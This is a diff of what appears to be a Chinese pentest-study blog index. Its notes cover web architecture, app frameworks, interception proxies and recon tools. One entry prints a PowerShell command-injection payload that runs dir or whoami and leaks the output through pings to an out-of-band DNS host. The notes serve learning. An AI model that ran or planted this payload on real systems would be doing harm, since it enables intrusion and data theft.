+<h2 id="源码和URL访问对应关系"><a href="#源码和URL访问对应关系" class="headerlink" title="源码和URL访问对应关系"></a>源码和URL访问对应关系</h2><p><strong>绝对路径</strong>：C:\Users\Username\Documents\file.txt（写全的就是绝对路径）</p>
+<p><strong>相对路径</strong>：.\file.txt（没写全的就是相对路径，使用了.\代替）</p>
+<p>例如mvc源码，Java和Python：URL和文件目录对应不上，上传到目录下，但是访问不到，必须按照特定的路由规则去配置访问<br><br></p>
+<h2 id="文件访问解析"><a href="#文件访问解析" class="headerlink" title="文件访问解析"></a>文件访问解析</h2><p>可以通过中间件来更改目录的文件访问权限</p>
+<p>后门上传之后，要分有没有执行权限，没有权限无法读取和运行</p>
+<p>但一般网站里面的文件执行权限不可能都锁，一般锁图片目录运行就可以了，不然所有目录都锁了，网站直接运行不了<br><br></p>
+<h2 id="站库分离，云数据库存储RDS，云对象存储OSS"><a href="#站库分离，云数据库存储RDS，云对象存储OSS" class="headerlink" title="站库分离，云数据库存储RDS，云对象存储OSS"></a>站库分离，云数据库存储RDS，云对象存储OSS</h2><p><strong>本地一致</strong>：数据库就放在同服务器地址下</p>
+<p><strong>站库分离</strong>：另一台服务器存放数据库，或者使用云数据库RDS应用，云数据库不用服务器并且设置安全组，只允许某些IP连接，包括外连特性，绑定特性，阿里云Key等等更多方式连接站库分离的连接方式，甚至有账号密码都连不上，禁止外连<br><br></p>
+<h2 id="中间件配置影响后续手法"><a href="#中间件配置影响后续手法" class="headerlink" title="中间件配置影响后续手法"></a>中间件配置影响后续手法</h2><p><strong>身份验证</strong>：Windows身份验证，绕过不了，必须要账号和密码</p>
+<p><strong>目录权限</strong>：防止后门上传并运行</p>
+<p><strong>解析规则</strong>：以不同的文件后缀名，该下载的下载，该打开的打开，如果更改了MIME类型设置就会改变原有情况<br><br></p>
+<h2 id="正确大小写命名："><a href="#正确大小写命名：" class="headerlink" title="正确大小写命名："></a>正确大小写命名：</h2><p>Java<br>Python<br>PHP<br>Windos<br>Linux<br>IIS<br>ZBlog<br>MySQL<br>ASP<br>DZ<br>通达OA<br>WordPress<br>Key<br>JS<br>API<br>HTML5<br>Vue<br>phpStudy<br>WAF<br>CDN<br>iOS<br>Kotlin<br>App<br>IDEA</p>
 ]]></content>
       <categories>
-        <category>信息打点</category>
+        <category>基础入门</category>
       </categories>
   </entry>
   <entry>
@@ -1776,100 +1863,6 @@
       </categories>
   </entry>
   <entry>
-    <title>APP架构&amp;小程序&amp;H5+Vue语言&amp;Web封装&amp;原生开发&amp;Flutter</title>
-    <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A84/</url>
-    <content><![CDATA[<h2 id="APP应用开发架构："><a href="#APP应用开发架构：" class="headerlink" title="APP应用开发架构："></a>APP应用开发架构：</h2><ol>
-<li><p>原生开发<br>安卓一般使用Java语言开发，当然现在也有Kotlin语言进行开发。简单描述就是使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件来实现。</p>
-</li>
-<li><p>使用HTML5语言开发<br>使用HTML5开发的好处有很多，可多端复用，比如浏览器端，iOS端，当然HTML5开发是没有原生好的。</p>
-</li>
-<li><p>使用Flutter开发<br>Flutter是近年来谷歌推出的一款UI框架，使用Dart语言进行开发，支持跨平台，体验可媲美原生。但是Flutter技术比较新，生态还不完善，开发效率相对偏低。</p>
-</li>
-<li><p>常规Web开发<br>Web App软件开发简单地说，就是开发一个网站，然后加入App的壳。Web App一般非常小，内容都是App内的网页展示。受制于网页技术本身，可实现功能少，每次打开，几乎所有的内容都需要重新加载，反应速度慢，内容加载过多就容易卡死，用户体验差，而且App内的交互设计等非常有效。但开发周期短，需要的技术人员少，成本低。使用网上的一门，变色龙网站等，可以把电脑网站转成手机App版本。</p>
-<br>
-<br></li>
-</ol>
-<h2 id="APP-开发架构-原生态-IDEA"><a href="#APP-开发架构-原生态-IDEA" class="headerlink" title="APP-开发架构-原生态-IDEA"></a>APP-开发架构-原生态-IDEA</h2><p>开发难度是最难的，但是效果是最好的</p>
-<p><strong>安全影响</strong>：需要反编译 &amp; 抓包 &amp; 提取出资产信息测试，逆向的角度去分析逻辑设计的安全性。<br><br></p>
-<h2 id="APP-开发架构–Web封装-封装平台"><a href="#APP-开发架构–Web封装-封装平台" class="headerlink" title="APP-开发架构–Web封装-封装平台"></a>APP-开发架构–Web封装-封装平台</h2><p><strong>安全影响</strong>：本身就是Web，进行抓包Web安全测试即可<br><br></p>
-<h2 id="APP-开发架构-HTML5-Vue-HBuilderX"><a href="#APP-开发架构-HTML5-Vue-HBuilderX" class="headerlink" title="APP-开发架构-HTML5&amp;Vue-HBuilderX"></a>APP-开发架构-HTML5&amp;Vue-HBuilderX</h2><p><strong>安全影响</strong>：API &amp; JS框架安全问题 &amp; JS前端测试，前后端分离，JS渗透测试，接口安全，框架安全测试<br><br></p>
-<h2 id="WX小程序-开发架构-Web封装-平台"><a href="#WX小程序-开发架构-Web封装-平台" class="headerlink" title="WX小程序-开发架构-Web封装-平台"></a>WX小程序-开发架构-Web封装-平台</h2><p><strong>安全影响</strong>：本身就是Web，进行Web抓包安全测试即可<br><br></p>
-<h2 id="WX小程序-开发架构-H5-Vue-HBuilderX"><a href="#WX小程序-开发架构-H5-Vue-HBuilderX" class="headerlink" title="WX小程序-开发架构-H5&amp;Vue-HBuilderX"></a>WX小程序-开发架构-H5&amp;Vue-HBuilderX</h2><p><strong>安全影响</strong>：API &amp; JS框架安全问题 &amp; JS前端测试</p>
-]]></content>
-      <categories>
-        <category>基础入门</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Web应用&amp;架构搭建&amp;站库分离&amp;路由访问&amp;配置受限&amp;DNS解析</title>
-    <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A81/</url>
-    <content><![CDATA[<h2 id="常规的Web应用搭建："><a href="#常规的Web应用搭建：" class="headerlink" title="常规的Web应用搭建："></a>常规的Web应用搭建：</h2><ol>
-<li>购买服务器，购买域名（阿里云）</li>
-<li>搭建中间件（IIS）</li>
-<li>下载并上传Web程序源码（ZBlog）</li>
-<li>添加网站并绑定域名目录<br>
-<br></li>
-</ol>
-<h2 id="Web必备四大件作用"><a href="#Web必备四大件作用" class="headerlink" title="Web必备四大件作用"></a>Web必备四大件作用</h2><p>系统（Windos）<br>中间件（IIS）<br>数据库（MySQL）<br>源码（开源ZBlog）<br><br></p>
-<h2 id="网站有哪些形式展示"><a href="#网站有哪些形式展示" class="headerlink" title="网站有哪些形式展示"></a>网站有哪些形式展示</h2><p><strong>子域名模式搭建</strong>:（这是四套完全不同的程序，不同的域名就是四个目标）</p>
-<ol>
-<li>cypher.com ZBlog ASP程序</li>
-<li>cypher.sun.com WordPress PHP程序</li>
-<li>bbs.cypher.com 论讨 DZ程序</li>
-<li>oa.cypher.com OA 通达OA程序<br>
-<br></li>
-</ol>
-<p><strong>端口模式搭建</strong>:（这是两套完全不同的端口，就是两个目标）</p>
-<ol>
-<li>cypher.com ZBlog ASP程序（80默认端口）</li>
-<li>cypher.com:81 WordPress PHP程序<br>
-<br></li>
-</ol>
-<p><strong>目录模式搭建</strong>:（这是两套是在一个目录里，但是是两个目标）</p>
-<ol>
-<li>cypher.com ZBlog ASP程序</li>
-<li>cypher.com&#x2F;blog WordPress PHP程序</li>
-</ol>
-<p>或者集成软件 &amp; Docker容器 &amp; 分配站等<br><br></p>
-<h2 id="源码类型"><a href="#源码类型" class="headerlink" title="源码类型"></a>源码类型</h2><p><strong>开源</strong>：网上免费的源码，源码也分可见和不可见的（ZBlog）</p>
-<p><strong>商业</strong>：花钱找人开发，大部分源码不可见，加密（ASP加密软件），语言特性决定（Java）</p>
-<p><strong>自写</strong>：大型公司都是自写（百度，阿里都有自己的源码）</p>
-<p><strong>源码的结构组成</strong>：数据库目录，后台目录，文件目录<br><br></p>
-<h2 id="源码和URL访问对应关系"><a href="#源码和URL访问对应关系" class="headerlink" title="源码和URL访问对应关系"></a>源码和URL访问对应关系</h2><p><strong>绝对路径</strong>：C:\Users\Username\Documents\file.txt（写全的就是绝对路径）</p>
-<p><strong>相对路径</strong>：.\file.txt（没写全的就是相对路径，使用了.\代替）</p>
-<p>例如mvc源码，Java和Python：URL和文件目录对应不上，上传到目录下，但是访问不到，必须按照特定的路由规则去配置访问<br><br></p>
-<h2 id="文件访问解析"><a href="#文件访问解析" class="headerlink" title="文件访问解析"></a>文件访问解析</h2><p>可以通过中间件来更改目录的文件访问权限</p>
-<p>后门上传之后，要分有没有执行权限，没有权限无法读取和运行</p>
-<p>但一般网站里面的文件执行权限不可能都锁，一般锁图片目录运行就可以了，不然所有目录都锁了，网站直接运行不了<br><br></p>
-<h2 id="站库分离，云数据库存储RDS，云对象存储OSS"><a href="#站库分离，云数据库存储RDS，云对象存储OSS" class="headerlink" title="站库分离，云数据库存储RDS，云对象存储OSS"></a>站库分离，云数据库存储RDS，云对象存储OSS</h2><p><strong>本地一致</strong>：数据库就放在同服务器地址下</p>
-<p><strong>站库分离</strong>：另一台服务器存放数据库，或者使用云数据库RDS应用，云数据库不用服务器并且设置安全组，只允许某些IP连接，包括外连特性，绑定特性，阿里云Key等等更多方式连接站库分离的连接方式，甚至有账号密码都连不上，禁止外连<br><br></p>
-<h2 id="中间件配置影响后续手法"><a href="#中间件配置影响后续手法" class="headerlink" title="中间件配置影响后续手法"></a>中间件配置影响后续手法</h2><p><strong>身份验证</strong>：Windows身份验证，绕过不了，必须要账号和密码</p>
-<p><strong>目录权限</strong>：防止后门上传并运行</p>
-<p><strong>解析规则</strong>：以不同的文件后缀名，该下载的下载，该打开的打开，如果更改了MIME类型设置就会改变原有情况<br><br></p>
-<h2 id="正确大小写命名："><a href="#正确大小写命名：" class="headerlink" title="正确大小写命名："></a>正确大小写命名：</h2><p>Java<br>Python<br>PHP<br>Windos<br>Linux<br>IIS<br>ZBlog<br>MySQL<br>ASP<br>DZ<br>通达OA<br>WordPress<br>Key<br>JS<br>API<br>HTML5<br>Vue<br>phpStudy<br>WAF<br>CDN<br>iOS<br>Kotlin<br>App<br>IDEA</p>
-]]></content>
-      <categories>
-        <category>基础入门</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>抓包技术&amp;HTTPS协议&amp;APP&amp;小程序&amp;PC应用&amp;WEB&amp;转发联动</title>
-    <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A86/</url>
-    <content><![CDATA[<h2 id="准备工作："><a href="#准备工作：" class="headerlink" title="准备工作："></a>准备工作：</h2><ol>
-<li>浏览器安装证书：解决本地抓HTTPS</li>
-<li>模拟器安装证书：解决模拟器抓HTTPS<br>
-<br></li>
-</ol>
-<h2 id="Fiddler："><a href="#Fiddler：" class="headerlink" title="Fiddler："></a>Fiddler：</h2><p>Fiddler是一个HTTP协议调试代理工具，它能够记录并检查所有你的电脑和互联网之间的HTTP通讯，设置断点，查看所有的进出Fiddler的数据（cookie, HTML, JS, CSS等文件）<br><br></p>
-<h2 id="Charles："><a href="#Charles：" class="headerlink" title="Charles："></a>Charles：</h2><p>Charles是一个HTTP代理服务器，HTTP监视器，代理服务器，当浏览器连接Charles的代理访问互联网时，Charles可以监控浏览器发送和接收的数据。它允许开发者查看所有连接互联网的HTTP通信，这些包括request, response和headers（包含cookies信息）</p>
-<p>tcpdump：是可以将网络中传送的数据包完全截获下来并分析。它针对网络层，协议，主机，网络或端口的过滤，并提供and，or，not等逻辑语句来去掉无用的信息。<br><br></p>
-<h2 id="Burp-Suite："><a href="#Burp-Suite：" class="headerlink" title="Burp Suite："></a>Burp Suite：</h2><p>Burp Suite是用于测试Web应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快测试应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP消息，代理，日志，警报等。</p>
-]]></content>
-      <categories>
-        <category>基础入门</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Web架构&amp;OSS存储&amp;负载均衡&amp;CDN加速&amp;反向代理&amp;WAF防护</title>
     <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A83/</url>
     <content><![CDATA[<h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p><strong>原理</strong>：Web应用防火墙，旨在提供保护</p>
@@ -1912,6 +1905,31 @@
 <p><strong>注意</strong>：正向代理和反向代理都是解决访问不可达的问题，但由于反向代理服务器可能会根据自己的配置将请求发送给任意的后端服务器，而不一定是客户端请求的目标资源的真实应用服务器<br><br></p>
 <h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><p><strong>原理</strong>：分摊到多个服务器来支撑服务，共同完成工作任务，一台服务器崩了还有备份</p>
 <p><strong>影响</strong>：有多个服务器加载服务，会测试过程中存在多个目标情况</p>
+]]></content>
+      <categories>
+        <category>基础入门</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>APP架构&amp;小程序&amp;H5+Vue语言&amp;Web封装&amp;原生开发&amp;Flutter</title>
+    <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A84/</url>
+    <content><![CDATA[<h2 id="APP应用开发架构："><a href="#APP应用开发架构：" class="headerlink" title="APP应用开发架构："></a>APP应用开发架构：</h2><ol>
+<li><p>原生开发<br>安卓一般使用Java语言开发，当然现在也有Kotlin语言进行开发。简单描述就是使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件来实现。</p>
+</li>
+<li><p>使用HTML5语言开发<br>使用HTML5开发的好处有很多，可多端复用，比如浏览器端，iOS端，当然HTML5开发是没有原生好的。</p>
+</li>
+<li><p>使用Flutter开发<br>Flutter是近年来谷歌推出的一款UI框架，使用Dart语言进行开发，支持跨平台，体验可媲美原生。但是Flutter技术比较新，生态还不完善，开发效率相对偏低。</p>
+</li>
+<li><p>常规Web开发<br>Web App软件开发简单地说，就是开发一个网站，然后加入App的壳。Web App一般非常小，内容都是App内的网页展示。受制于网页技术本身，可实现功能少，每次打开，几乎所有的内容都需要重新加载，反应速度慢，内容加载过多就容易卡死，用户体验差，而且App内的交互设计等非常有效。但开发周期短，需要的技术人员少，成本低。使用网上的一门，变色龙网站等，可以把电脑网站转成手机App版本。</p>
+<br>
+<br></li>
+</ol>
+<h2 id="APP-开发架构-原生态-IDEA"><a href="#APP-开发架构-原生态-IDEA" class="headerlink" title="APP-开发架构-原生态-IDEA"></a>APP-开发架构-原生态-IDEA</h2><p>开发难度是最难的，但是效果是最好的</p>
+<p><strong>安全影响</strong>：需要反编译 &amp; 抓包 &amp; 提取出资产信息测试，逆向的角度去分析逻辑设计的安全性。<br><br></p>
+<h2 id="APP-开发架构–Web封装-封装平台"><a href="#APP-开发架构–Web封装-封装平台" class="headerlink" title="APP-开发架构–Web封装-封装平台"></a>APP-开发架构–Web封装-封装平台</h2><p><strong>安全影响</strong>：本身就是Web，进行抓包Web安全测试即可<br><br></p>
+<h2 id="APP-开发架构-HTML5-Vue-HBuilderX"><a href="#APP-开发架构-HTML5-Vue-HBuilderX" class="headerlink" title="APP-开发架构-HTML5&amp;Vue-HBuilderX"></a>APP-开发架构-HTML5&amp;Vue-HBuilderX</h2><p><strong>安全影响</strong>：API &amp; JS框架安全问题 &amp; JS前端测试，前后端分离，JS渗透测试，接口安全，框架安全测试<br><br></p>
+<h2 id="WX小程序-开发架构-Web封装-平台"><a href="#WX小程序-开发架构-Web封装-平台" class="headerlink" title="WX小程序-开发架构-Web封装-平台"></a>WX小程序-开发架构-Web封装-平台</h2><p><strong>安全影响</strong>：本身就是Web，进行Web抓包安全测试即可<br><br></p>
+<h2 id="WX小程序-开发架构-H5-Vue-HBuilderX"><a href="#WX小程序-开发架构-H5-Vue-HBuilderX" class="headerlink" title="WX小程序-开发架构-H5&amp;Vue-HBuilderX"></a>WX小程序-开发架构-H5&amp;Vue-HBuilderX</h2><p><strong>安全影响</strong>：API &amp; JS框架安全问题 &amp; JS前端测试</p>
 ]]></content>
       <categories>
         <category>基础入门</category>
@@ -1993,6 +2011,23 @@
 <p>需要replace “\” 为字母或其他来分割带外出来的数据</p>
 <p>最后就可以结果带出来了，ping到带外网站就可以直接带出Windows的数据了</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$x</span>=<span class="built_in">whoami</span></span><br><span class="line"><span class="variable">$x</span>=<span class="variable">$x</span>.Replace(<span class="string">&#x27;\&#x27;</span>,<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"><span class="variable">$y</span>=<span class="string">&#x27;.47fa801887.ipv6.1433.eu.org.&#x27;</span></span><br><span class="line"><span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span></span><br><span class="line">ping <span class="variable">$z</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#组合起来</span></span><br><span class="line">127.0.0.1 | powershell <span class="variable">$x</span>=<span class="built_in">dir</span>;<span class="variable">$x</span>=<span class="variable">$x</span>.Replace(<span class="string">&#x27;\&#x27;</span>,<span class="string">&#x27;xxx&#x27;</span>);<span class="variable">$y</span>=<span class="string">&#x27;.47fa801887.ipv6.1433.eu.org.&#x27;</span>;<span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;ping <span class="variable">$z</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>基础入门</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>抓包技术&amp;HTTPS协议&amp;APP&amp;小程序&amp;PC应用&amp;WEB&amp;转发联动</title>
+    <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A86/</url>
+    <content><![CDATA[<h2 id="准备工作："><a href="#准备工作：" class="headerlink" title="准备工作："></a>准备工作：</h2><ol>
+<li>浏览器安装证书：解决本地抓HTTPS</li>
+<li>模拟器安装证书：解决模拟器抓HTTPS<br>
+<br></li>
+</ol>
+<h2 id="Fiddler："><a href="#Fiddler：" class="headerlink" title="Fiddler："></a>Fiddler：</h2><p>Fiddler是一个HTTP协议调试代理工具，它能够记录并检查所有你的电脑和互联网之间的HTTP通讯，设置断点，查看所有的进出Fiddler的数据（cookie, HTML, JS, CSS等文件）<br><br></p>
+<h2 id="Charles："><a href="#Charles：" class="headerlink" title="Charles："></a>Charles：</h2><p>Charles是一个HTTP代理服务器，HTTP监视器，代理服务器，当浏览器连接Charles的代理访问互联网时，Charles可以监控浏览器发送和接收的数据。它允许开发者查看所有连接互联网的HTTP通信，这些包括request, response和headers（包含cookies信息）</p>
+<p>tcpdump：是可以将网络中传送的数据包完全截获下来并分析。它针对网络层，协议，主机，网络或端口的过滤，并提供and，or，not等逻辑语句来去掉无用的信息。<br><br></p>
+<h2 id="Burp-Suite："><a href="#Burp-Suite：" class="headerlink" title="Burp Suite："></a>Burp Suite：</h2><p>Burp Suite是用于测试Web应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快测试应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP消息，代理，日志，警报等。</p>
+]]></content>
       <categories>
         <category>基础入门</category>
       </categories>
@@ -2088,28 +2123,6 @@
       <categories>
         <category>基础入门</category>
       </categories>
-  </entry>
-  <entry>
-    <title>ARL</title>
-    <url>/2024/03/11/%E5%B7%A5%E5%85%B7ARL/</url>
-    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/TophantTechnology/ARL">ARL</a><br><br></p>
-<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>ARL旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。<br><br></p>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><ol>
-<li><p>阿里云，购买Ubuntu 18.04服务器</p>
-</li>
-<li><p>进入Ubuntu服务器</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>参考<a href="https://tophanttechnology.github.io/ARL-doc/system_install/">官方文档</a>执行命令即可</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>综合架构</tag>
-      </tags>
   </entry>
   <entry>
     <title>算法分析&amp;传输加密&amp;数据格式&amp;密文存储&amp;代码混淆&amp;逆向保护</title>
@@ -2234,6 +2247,28 @@
       </tags>
   </entry>
   <entry>
+    <title>ARL</title>
+    <url>/2024/03/11/%E5%B7%A5%E5%85%B7ARL/</url>
+    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/TophantTechnology/ARL">ARL</a><br><br></p>
+<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>ARL旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。<br><br></p>
+<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><ol>
+<li><p>阿里云，购买Ubuntu 18.04服务器</p>
+</li>
+<li><p>进入Ubuntu服务器</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>参考<a href="https://tophanttechnology.github.io/ARL-doc/system_install/">官方文档</a>执行命令即可</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>综合架构</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>AsamF</title>
     <url>/2024/03/12/%E5%B7%A5%E5%85%B7AsamF/</url>
     <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/Kento-Sec/AsamF">AsamF</a><br><br></p>
@@ -2296,6 +2331,55 @@
       </tags>
   </entry>
   <entry>
+    <title>ENScan_GO</title>
+    <url>/2024/03/11/%E5%B7%A5%E5%85%B7ENScan_GO/</url>
+    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/wgpsec/ENScan_GO">ENScan_GO</a><br><br></p>
+<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>剑指HW&#x2F;SRC，解决在HW&#x2F;SRC场景下遇到的各种针对国内企业信息收集难题<br><br></p>
+<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><ol>
+<li><p>根目录下cmd</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enscan-0.0.10-windows-amd64.exe -v</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>打开目录下生成的配置文件</p>
+</li>
+<li><p>登录各个网站，然后复制出cookie进行配置</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>企查信息</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Charles</title>
+    <url>/2024/03/10/%E5%B7%A5%E5%85%B7Charles/</url>
+    <content><![CDATA[<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="https://www.charlesproxy.com/">Charles</a><br><br></p>
+<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>Charles是一个HTTP代理服务器，HTTP监视器，反转代理服务器，当浏览器连接Charles的代理访问互联网时，Charles可以监控浏览器发送和接收数据。它允许一个开发者查看所有连接互联网的HTTP通信，这些包括request, response和headers（包含cookies信息）。</p>
+<p><strong>tcpdump</strong>：是可以将网络中传送的数据包截获下来并分析。它针对网络层，协议，主机，网络或端口的过滤，并提供and，or，not等逻辑语句来去掉无用的信息。<br><br></p>
+<h2 id="证书下载"><a href="#证书下载" class="headerlink" title="证书下载"></a>证书下载</h2><ol>
+<li>Help -&gt; SSL Proxying -&gt; Save Charles Root Certificate</li>
+<li>保存为Charles.pem<br>
+<br></li>
+</ol>
+<h2 id="逍遥模拟器证书"><a href="#逍遥模拟器证书" class="headerlink" title="逍遥模拟器证书"></a>逍遥模拟器证书</h2><ol>
+<li>共享 -&gt; 音乐共享路径win，把证书复制粘贴进来</li>
+<li>设置 -&gt; 安全性和位置信息 -&gt; 加密与凭据 -&gt; 从SD卡安装 -&gt; Music，然后点击安装证书<br>
+<br></li>
+</ol>
+<h2 id="安装Chrome证书"><a href="#安装Chrome证书" class="headerlink" title="安装Chrome证书"></a>安装Chrome证书</h2><ol>
+<li>设置 -&gt; 搜索证书 -&gt; 安全 -&gt; 管理证书 -&gt; 安装到中间证书颁发机构，受信任的根证书颁发机构</li>
+</ol>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>抓包</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Fiddler</title>
     <url>/2024/03/10/%E5%B7%A5%E5%85%B7Fiddler/</url>
     <content><![CDATA[<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="https://www.telerik.com/fiddler">Fiddler</a><br><br></p>
@@ -2341,55 +2425,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Charles</title>
-    <url>/2024/03/10/%E5%B7%A5%E5%85%B7Charles/</url>
-    <content><![CDATA[<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="https://www.charlesproxy.com/">Charles</a><br><br></p>
-<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>Charles是一个HTTP代理服务器，HTTP监视器，反转代理服务器，当浏览器连接Charles的代理访问互联网时，Charles可以监控浏览器发送和接收数据。它允许一个开发者查看所有连接互联网的HTTP通信，这些包括request, response和headers（包含cookies信息）。</p>
-<p><strong>tcpdump</strong>：是可以将网络中传送的数据包截获下来并分析。它针对网络层，协议，主机，网络或端口的过滤，并提供and，or，not等逻辑语句来去掉无用的信息。<br><br></p>
-<h2 id="证书下载"><a href="#证书下载" class="headerlink" title="证书下载"></a>证书下载</h2><ol>
-<li>Help -&gt; SSL Proxying -&gt; Save Charles Root Certificate</li>
-<li>保存为Charles.pem<br>
-<br></li>
-</ol>
-<h2 id="逍遥模拟器证书"><a href="#逍遥模拟器证书" class="headerlink" title="逍遥模拟器证书"></a>逍遥模拟器证书</h2><ol>
-<li>共享 -&gt; 音乐共享路径win，把证书复制粘贴进来</li>
-<li>设置 -&gt; 安全性和位置信息 -&gt; 加密与凭据 -&gt; 从SD卡安装 -&gt; Music，然后点击安装证书<br>
-<br></li>
-</ol>
-<h2 id="安装Chrome证书"><a href="#安装Chrome证书" class="headerlink" title="安装Chrome证书"></a>安装Chrome证书</h2><ol>
-<li>设置 -&gt; 搜索证书 -&gt; 安全 -&gt; 管理证书 -&gt; 安装到中间证书颁发机构，受信任的根证书颁发机构</li>
-</ol>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>抓包</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ENScan_GO</title>
-    <url>/2024/03/11/%E5%B7%A5%E5%85%B7ENScan_GO/</url>
-    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/wgpsec/ENScan_GO">ENScan_GO</a><br><br></p>
-<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>剑指HW&#x2F;SRC，解决在HW&#x2F;SRC场景下遇到的各种针对国内企业信息收集难题<br><br></p>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><ol>
-<li><p>根目录下cmd</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enscan-0.0.10-windows-amd64.exe -v</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>打开目录下生成的配置文件</p>
-</li>
-<li><p>登录各个网站，然后复制出cookie进行配置</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>企查信息</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>FireEyeGoldCrystal</title>
     <url>/2024/03/12/%E5%B7%A5%E5%85%B7FireEyeGoldCrystal/</url>
     <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/NHPT/FireEyeGoldCrystal">FireEyeGoldCrystal</a><br><br></p>
@@ -2414,6 +2449,26 @@
       </tags>
   </entry>
   <entry>
+    <title>Github-Monitor</title>
+    <url>/2024/03/11/%E5%B7%A5%E5%85%B7Github-Monitor/</url>
+    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/Explorer1092/Github-Monitor">Github-Monitor</a><br><br></p>
+<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>GITHUB MONITOR 是vipkid安全研发团队打造的用于监控Github代码仓库的系统。通过该系统可以及时发现企业内部代码泄露、从而降低由于代码泄露导致的一系列安全风险。用户仅需通过简单的任务配置，即可在分钟级发现代码泄露的情况。项目后端使用 django-rest-framework 开发，前端使用 react 和 antd-pro 开发。<br><br></p>
+<h2 id="搭建流程："><a href="#搭建流程：" class="headerlink" title="搭建流程："></a>搭建流程：</h2><ol>
+<li><p>阿里云购买Ubuntu 18.04服务器</p>
+</li>
+<li><p>连接服务器</p>
